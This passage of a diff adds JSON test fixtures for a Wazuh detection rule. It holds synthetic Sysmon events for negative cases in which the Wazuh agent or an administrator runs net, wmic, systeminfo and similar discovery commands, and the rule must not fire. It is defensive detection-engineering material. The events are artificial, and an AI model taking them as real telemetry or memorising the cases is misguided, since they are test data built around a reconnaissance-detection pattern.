+      "ParentImage": "C:\\Windows\\CCM\\CcmExec.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\hostname.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "hostname.exe",
+      "CommandLine": "hostname",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\CCM\\CcmExec.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\ipconfig.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "ipconfig.exe",
+      "CommandLine": "ipconfig",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\CCM\\CcmExec.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\systeminfo.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "sysinfo.exe",
+      "CommandLine": "systeminfo",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\CCM\\CcmExec.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\tasklist.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "tasklist.exe",
+      "CommandLine": "tasklist",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\CCM\\CcmExec.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    }
+   ],
+   "expect": [],
+   "forbid": [
+    112110
+   ]
+  },
+  {
+   "id": "UC21-08",
+   "title": "Wazuh agent's own SCA scan (found live in the lab: wmic + net as SYSTEM) - no burst",
+   "kind": "negative",
+   "events": [
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "wmic.exe",
+      "CommandLine": "wmic useraccount where (sid like \"S-1-5-21-%-500\") get name",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "NT AUTHORITY\\SYSTEM",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe",
+      "ParentCommandLine": "C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe",
+      "ParentUser": "NT AUTHORITY\\SYSTEM"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "wmic.exe",
+      "CommandLine": "wmic useraccount where (sid like \"S-1-5-21-%-500\") get name",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "NT AUTHORITY\\SYSTEM",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe",
+      "ParentCommandLine": "C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe",
+      "ParentUser": "NT AUTHORITY\\SYSTEM"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net.exe",
+      "CommandLine": "net user",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "NT AUTHORITY\\SYSTEM",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe",
+      "ParentCommandLine": "C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe",
+      "ParentUser": "NT AUTHORITY\\SYSTEM"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net1.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net1.exe",
+      "CommandLine": "C:\\Windows\\system32\\net1 user",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "NT AUTHORITY\\SYSTEM",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\net.exe",
+      "ParentCommandLine": "C:\\Windows\\System32\\net.exe",
+      "ParentUser": "NT AUTHORITY\\SYSTEM"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net.exe",
+      "CommandLine": "net user",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "NT AUTHORITY\\SYSTEM",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe",
+      "ParentCommandLine": "C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe",
+      "ParentUser": "NT AUTHORITY\\SYSTEM"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net1.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net1.exe",
+      "CommandLine": "C:\\Windows\\system32\\net1 user",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "NT AUTHORITY\\SYSTEM",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\net.exe",
+      "ParentCommandLine": "C:\\Windows\\System32\\net.exe",
+      "ParentUser": "NT AUTHORITY\\SYSTEM"
+     }
+    }
+   ],
+   "expect": [],
+   "forbid": [
+    112110
+   ]
+  },
+  {
+   "id": "UC21-09",
+   "title": "Admin runs several net.exe queries; net1.exe children are not counted again - no burst",
+   "kind": "negative",
+   "events": [
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net.exe",
+      "CommandLine": "net user",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net1.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net1.exe",
+      "CommandLine": "C:\\Windows\\system32\\net1 user",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\net.exe",
+      "ParentCommandLine": "C:\\Windows\\System32\\net.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net.exe",
+      "CommandLine": "net localgroup",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net1.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net1.exe",
+      "CommandLine": "C:\\Windows\\system32\\net1 localgroup",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\net.exe",
+      "ParentCommandLine": "C:\\Windows\\System32\\net.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net.exe",
+      "CommandLine": "net accounts",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net1.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net1.exe",
+      "CommandLine": "C:\\Windows\\system32\\net1 accounts",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\net.exe",
+      "ParentCommandLine": "C:\\Windows\\System32\\net.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net.exe",
+      "CommandLine": "net share",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net1.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net1.exe",
+      "CommandLine": "C:\\Windows\\system32\\net1 share",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\net.exe",
+      "ParentCommandLine": "C:\\Windows\\System32\\net.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net.exe",
+      "CommandLine": "net view",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net1.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net1.exe",
+      "CommandLine": "C:\\Windows\\system32\\net1 view",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\net.exe",
+      "ParentCommandLine": "C:\\Windows\\System32\\net.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    }
+   ],
+   "expect": [],
+   "forbid": [
+    112110
+   ]
+  }
+ ]
+}
